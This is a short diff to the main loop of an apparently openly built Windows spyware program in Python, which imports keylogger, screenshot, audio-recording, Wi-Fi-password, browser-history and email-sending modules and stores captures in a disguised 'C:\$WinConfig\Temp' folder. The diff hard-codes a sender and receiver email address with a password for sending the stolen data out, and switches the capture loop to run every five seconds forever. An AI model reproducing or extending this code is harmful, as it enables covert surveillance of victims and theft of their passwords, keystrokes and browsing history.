@@ -1,4 +1,5 @@
 import os
+import time
 from zipfile import ZipFile
 from KeyLogger import KeyLogger
 from ScreenShot import ScreenShot
@@ -6,7 +7,6 @@ from SoundRecord import SoundRecord
 from WifiPassword import WifiPassword
 from BrowserHistory import BrowserHistory
 from SendEmail import SendEmail
-from threading import Thread
 
 # main program 
 
@@ -15,9 +15,9 @@ dir = "C:\$WinConfig\Temp"
 # default aduio record and key logging duration 
 default_duration = 10
 # emaill address and password
-send_email_address = ""
-receive_email_address = ""
-email_password = ""
+send_email_address = "samplereciver97@gmail.com"
+receive_email_address = "samplereciver97@gmail.com"
+email_password = "1234.abcd"
 
 try: 
     os.makedirs(dir)
@@ -52,7 +52,5 @@ def task():
 
 if __name__ == '__main__':
     while True:
-        t = Thread(target=task)
-        t.start()
-        t.join()
-
+        task()
+        time.sleep(5)
